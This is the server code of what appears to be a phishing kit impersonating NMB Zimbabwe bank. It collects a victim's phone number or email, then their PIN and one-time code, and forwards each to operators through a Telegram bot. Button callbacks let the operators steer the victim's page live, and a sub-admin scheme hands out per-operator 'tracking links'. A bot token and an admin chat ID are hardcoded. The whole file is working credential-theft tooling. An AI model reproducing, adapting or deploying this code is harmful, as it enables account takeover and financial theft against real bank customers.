const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Fallbacks hardcoded with your provided values, with environment variable priority
const getBotToken = () => process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8920465891:AAH4BbOdX7XvNiHrKQrB_9CFErJV7gwpS5w';
const getAppUrl = () => process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : 'https://airtel-congo-d97u.onrender.com');
const getFallbackAdmin = () => process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8388502968';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
let activeToken = '';
const sessions = new Map();
const admins = loadAdmins();
const adminConfigMessageIds = new Map();

function isValidZimbabwePhone(phone) {
  if (!phone) return false;
  const cleaned = String(phone).replace(/\D/g, '');
  const regex = /^(?:263)?(7[1378]\d{7})$/;
  return regex.test(cleaned);
}

function resolveTargetChat(adminParam) {
  const fallbackAdminId = getFallbackAdmin();
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(fallbackAdminId)) {
      return fallbackAdminId;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized) {
      return targetAdmin;
    }
  }
  return fallbackAdminId || null;
}

async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
  const PAGE_SIZE = 5;
  const fallbackAdminId = getFallbackAdmin();
  const appUrl = getAppUrl();
  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(fallbackAdminId));
  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;

  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  let adminListText = `👑 *Sub-Admin Control Panel* (Page ${page + 1}/${totalPages})\n\nManage authorizations:`;
  let keyboard = [];

  if (adminEntries.length === 0) {
    adminListText += `\n\nNo sub-administrators at the moment.`;
  } else {
    paginatedEntries.forEach(([id, record]) => {
      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
      const authStatus = record.authorized ? '🟢 Authorized' : '🔴 Unauthorized';
      const subLink = `${appUrl}/?admin=${id}`;
      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)\n   Status: ${authStatus}\n   🔗 \`${subLink}\``;
    });
  }

  let navRow = [];
  if (page > 0) navRow.push({ text: `⬅️ Previous`, callback_data: `PAGE_${page - 1}` });
  navRow.push({ text: `🔄 Refresh`, callback_data: `PAGE_${page}` });
  if (page < totalPages - 1) navRow.push({ text: `Next ➡️`, callback_data: `PAGE_${page + 1}` });
  if (navRow.length > 0) keyboard.push(navRow);

  if (messageId) {
    try {
      await bot.editMessageText(adminListText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      return;
    } catch (err) {}
  }

  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: keyboard } 
  });
  adminConfigMessageIds.set(chatId, sentMsg.message_id);
}

function initBot() {
  const currentToken = getBotToken();
  const appUrl = getAppUrl();
  const fallbackAdminId = getFallbackAdmin();

  if (!currentToken) {
    console.error('FATAL: TELEGRAM_BOT_TOKEN is required.');
    return;
  }

  if (!appUrl) {
    console.error('FATAL: APP_URL is required.');
    return;
  }

  activeToken = currentToken;
  bot = new TelegramBot(currentToken, { polling: false });
  
  const webhookPath = `/bot${currentToken}`;
  const webhookUrl = `${appUrl}${webhookPath}`;

  bot.setWebHook(webhookUrl).catch((err) => {
    console.error('Failed to set webhook:', err);
  });

  app.post(webhookPath, (req, res) => {
    res.sendStatus(200);
    try { bot.processUpdate(req.body); } catch (err) {}
  });

  bot.onText(/\/admins/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (chatId !== String(fallbackAdminId)) {
      await bot.sendMessage(chatId, `⚠️ Unauthorized access.`);
      return;
    }
    await updateContinuousAdminList(chatId, null, 0);
  });

  bot.onText(/\/myprofile|\/me/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username ? `@${msg.from.username}` : 'None';
      const firstName = msg.from.first_name || 'Unknown';
      const lastName = msg.from.last_name || 'Unknown';
      
      if (chatId !== String(fallbackAdminId)) {
        const record = admins.get(chatId);
        if (!record || !record.authorized) {
          await bot.sendMessage(chatId, `⚠️ Your account is pending primary admin approval.`);
          return;
        }
      }
      
      const userLink = `${appUrl}/?admin=${chatId}`;
      let profileText = 
        `👤 *Your Link Information*\n\n` +
        `• *First Name:* ${firstName}\n` +
        `• *Last Name:* ${lastName}\n` +
        `• *Username:* ${username}\n` +
        `• *Telegram ID:* \`${userId}\`\n\n` +
        `🔗 *Your Specific Link:*\n${userLink}`;

      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username || '';
      const firstName = msg.from.first_name || 'User';
      const lastName = msg.from.last_name || '';

      if (chatId === String(fallbackAdminId)) {
        await bot.sendMessage(chatId, `👑 Welcome Main Admin. Free access active! Link: ${appUrl}\n\nType /admins to manage sub-admins.`, {
          parse_mode: 'Markdown'
        });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          authorized: false,
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      } else {
        const existing = admins.get(chatId);
        existing.username = username;
        existing.firstName = firstName;
        existing.lastName = lastName;
        saveAdmins();
      }

      const record = admins.get(chatId);

      if (!record.authorized) {
        await bot.sendMessage(fallbackAdminId, 
          `🚨 *New Sub-Admin Request!*\n\n` +
          `👤 *User:* ${username ? '@' + username : firstName} (${firstName}${lastName})\n` +
          `🆔 *Chat ID:* \`${userId}\`\n\n` +
          `Please approve or reject this request.`, 
          { 
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅ Authorize', callback_data: `AUTH_YES_${userId}` },
                  { text: '❌ Reject', callback_data: `AUTH_NO_${userId}` }
                ]
              ]
            }
          }
        );

        await bot.sendMessage(chatId, 
          `👋 *Welcome ${firstName}!*\n\n` +
          `⚠️ Your account is **pending approval** from the main administrator.\n\n` +
          `Please contact the admin to activate your link.`, 
          { parse_mode: 'Markdown' }
        );
        return;
      }

      const userLink = `${appUrl}/?admin=${chatId}`;
      let responseText = `👋 *Welcome ${firstName}!* Your account is active.\n\nYour tracking link is ready:\n${userLink}`;

      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);

      if (actionData.startsWith('AUTH_YES_') || actionData.startsWith('AUTH_NO_')) {
        if (chatId !== String(fallbackAdminId)) {
          await bot.answerCallbackQuery(query.id, { text: '⚠️ Unauthorized action.' });
          return;
        }

        const parts = actionData.split('_');
        const decision = parts[1];
        const targetSubId = parts[2];
        const subRecord = admins.get(targetSubId);

        if (!subRecord) {
          await bot.answerCallbackQuery(query.id, { text: '⚠️ Administrator not found.' });
          return;
        }

        if (decision === 'YES') {
          subRecord.authorized = true;
          saveAdmins();

          const assignedLink = `${appUrl}/?admin=${targetSubId}`;
          await bot.sendMessage(targetSubId, 
            `🎉 *Congratulations!* Your account has been approved.\n\n` +
            `🔗 *Your Link:*\n${assignedLink}`,
            { parse_mode: 'Markdown' }
          ).catch(() => {});

          await bot.answerCallbackQuery(query.id, { text: '✅ Successfully authorized!' });
          await bot.editMessageText(`✅ *Sub-Admin Authorized*\n\nID: \`${targetSubId}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
          });
        } else {
          admins.delete(targetSubId);
          saveAdmins();

          await bot.sendMessage(targetSubId, `❌ Your access request was declined.`).catch(() => {});
          await bot.answerCallbackQuery(query.id, { text: '❌ Request rejected.' });
          await bot.editMessageText(`❌ *Request Rejected*\n\nID: \`${targetSubId}\``, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: 'Markdown'
          });
        }
        return;
      }

      if (actionData.startsWith('PAGE_')) {
        const pageNum = parseInt(actionData.split('_')[1]) || 0;
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) {
        session = { contact: 'Unknown', adminChatId: chatId };
      }

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'next_step';
          await bot.sendMessage(chatTarget, `✅ Allowed for ${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'restart_pin';
          await bot.sendMessage(chatTarget, `❌ Denied for ${session.contact}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'success';
          await bot.sendMessage(chatTarget, `🎉 Success activated for ${session.contact}`);
          break;
        case 'WRONG_PIN':
          session.status = 'restart_pin';
          await bot.sendMessage(chatTarget, `⚠️ Wrong PIN action triggered.`);
          break;
        case 'WRONG_OTP':
          session.status = 'restart_otp';
          await bot.sendMessage(chatTarget, `⚠️ Wrong OTP action triggered.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` }).catch(() => {});

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(() => {});
      }
    } catch (err) {
      try {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Processing error.' }).catch(() => {});
      } catch (e) {}
    }
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contactType, phone, gmail, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    if (contactType === 'phone' && !isValidZimbabwePhone(phone)) {
      return res.status(400).json({ success: false, error: 'Invalid phone number. Must start with a valid Zimbabwe prefix (71, 73, 77, 78).' });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Invalid chat ID or unauthorized administrator.' });
    }

    const contactDisplay = contactType === 'phone' ? `+263${phone}` : gmail;
    const userId = `user_${Date.now()}`;

    sessions.set(userId, {
      contactType,
      contact: contactDisplay,
      adminChatId: targetChat,
      status: 'pending',
      createdAt: new Date()
    });

    return res.status(200).json({ success: true, sessionId: userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Server error: ' + (err?.message || 'Unknown') });
  }
});

app.post('/api/submit-pin', async (req, res) => {
  try {
    const { sessionId, pin } = req.body || {};
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.pin = pin;
    session.status = 'pending';

    const message = `🚨 <b>NMB ZIMBABWE - NEW SUBMISSION</b>\n\n` +
                    `📱 <b>Contact (${session.contactType.toUpperCase()}):</b> ${session.contact}\n` +
                    `🔑 <b>PIN Entered:</b> ${pin}\n\n` +
                    `<i>Choose action for applicant:</i>`;

    const opts = {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW', callback_data: `ALLOW_OTP_${sessionId}` },
            { text: '❌ DENY', callback_data: `DENY_OTP_${sessionId}` }
          ]
        ]
      }
    };

    if (bot && session.adminChatId) {
      const sentMsg = await bot.sendMessage(session.adminChatId, message, opts);
      session.adminMsgId = sentMsg.message_id;
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Telegram error' });
  }
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { sessionId, otp } = req.body || {};
    const session = sessions.get(sessionId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.otp = otp;
    session.status = 'pending';

    const message = `🔐 <b>NMB ZIMBABWE - OTP VERIFICATION</b>\n\n` +
                    `📱 <b>Contact (${session.contactType.toUpperCase()}):</b> ${session.contact}\n` +
                    `🔑 <b>OTP Code:</b> ${otp}\n\n` +
                    `<i>Verify OTP:</i>`;

    const opts = {
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${sessionId}` },
            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${sessionId}` }
          ],
          [
            { text: '✅ OTP VALIDE', callback_data: `CORRECT_OTP_${sessionId}` }
          ]
        ]
      }
    };

    if (bot && session.adminChatId) {
      const sentMsg = await bot.sendMessage(session.adminChatId, message, opts);
      session.adminMsgId = sentMsg.message_id;
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Telegram error' });
  }
});

app.get('/api/check-status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);
  if (!session) return res.status(200).json({ status: 'pending' });
  res.status(200).json({ status: session.status || 'pending' });
});

const PORT = process.env.PORT || 10000;

app.listen(PORT, () => {
  console.log(`Server is running and listening on port ${PORT}`);
  initBot();
});
        
